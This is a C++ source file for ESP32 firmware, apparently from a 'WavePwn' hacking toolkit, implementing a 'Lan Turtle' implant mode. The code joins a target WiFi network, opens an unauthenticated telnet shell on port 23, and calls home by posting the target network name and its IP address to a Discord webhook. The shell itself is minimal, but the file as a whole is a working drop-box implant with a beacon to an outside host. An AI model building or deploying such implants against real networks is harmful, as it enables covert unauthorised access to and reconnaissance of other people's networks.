#include "lan_turtle.h"
#include "../core/globals.h"
#include <HTTPClient.h>

LanTurtle lanTurtle;

LanTurtle::LanTurtle()
    : _active(false), _connected(false), _lastCheck(0), _telnetServer(23) {}

void LanTurtle::begin() {
  // Nada crítico na inicialização
}

void LanTurtle::start(const char *ssid, const char *password) {
  if (_active)
    return;

  _targetSSID = ssid;
  _targetPass = password;
  _active = true;
  _connected = false;

  Serial.printf("[TURTLE] Starting Lan Turtle Mode. Target: %s\n", ssid);

  // Conecta ao WiFi em modo Station
  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);
}

void LanTurtle::stop() {
  if (!_active)
    return;

  _active = false;
  _connected = false;
  _telnetServer.stop();
  if (_telnetClient)
    _telnetClient.stop();

  WiFi.disconnect(true);
  Serial.println("[TURTLE] Stopped.");
}

void LanTurtle::update() {
  if (!_active)
    return;

  // Verifica conexão
  if (WiFi.status() == WL_CONNECTED) {
    if (!_connected) {
      _connected = true;
      Serial.println("[TURTLE] Connected! IP: " + WiFi.localIP().toString());

      // Inicia servidor Telnet
      _telnetServer.begin();
      _telnetServer.setNoDelay(true);

      // Call Home (Discord)
      sendDiscordNotification();
    }

    handleTelnet();

  } else {
    _connected = false;
    // Retry logic is handled by WiFi.begin usually, but we could enforce
    // re-connect if needed
  }
}

void LanTurtle::handleTelnet() {
  // Aceita novos clientes (apenas um por vez neste exemplo simples)
  if (_telnetServer.hasClient()) {
    if (!_telnetClient || !_telnetClient.connected()) {
      if (_telnetClient)
        _telnetClient.stop();
      _telnetClient = _telnetServer.available();
      _telnetClient.println("Welcome to WavePwn Lan Turtle Shell!");
      _telnetClient.println("Type 'help' for commands.");
      _telnetClient.print("Shell> ");
    } else {
      // Rejeita conexões extras
      WiFiClient reject = _telnetServer.available();
      reject.stop();
    }
  }

  // Processa dados do cliente
  if (_telnetClient && _telnetClient.connected() && _telnetClient.available()) {
    String line = _telnetClient.readStringUntil('\n');
    line.trim();

    if (line.length() > 0) {
      Serial.printf("[TURTLE] Cmd: %s\n", line.c_str());

      if (line == "help") {
        _telnetClient.println("Commands: help, status, scan, reboot, exit");
      } else if (line == "status") {
        _telnetClient.printf("Uptime: %u s\n", millis() / 1000);
        _telnetClient.printf("IP: %s\n", WiFi.localIP().toString().c_str());
      } else if (line == "reboot") {
        _telnetClient.println("Rebooting...");
        delay(100);
        ESP.restart();
      } else if (line == "exit") {
        _telnetClient.stop();
      } else {
        _telnetClient.println("Unknown command.");
      }
      _telnetClient.print("Shell> ");
    }
  }
}

String LanTurtle::getIP() const {
  if (_connected)
    return WiFi.localIP().toString();
  return "Disconnected";
}

void LanTurtle::sendDiscordNotification() {
  if (strlen(g_state.discord_webhook) == 0)
    return;

  HTTPClient http;
  http.begin(g_state.discord_webhook);
  http.addHeader("Content-Type", "application/json");

  String content =
      "{\"content\": \"🐢 **Lan Turtle Active!**\\nTarget: " + _targetSSID +
      "\\nIP: " + WiFi.localIP().toString() + "\"}";

  int httpResponseCode = http.POST(content);
  if (httpResponseCode > 0) {
    Serial.printf("[TURTLE] Discord sent: %d\n", httpResponseCode);
  } else {
    Serial.printf("[TURTLE] Discord failed: %s\n",
                  http.errorToString(httpResponseCode).c_str());
  }
  http.end();
}
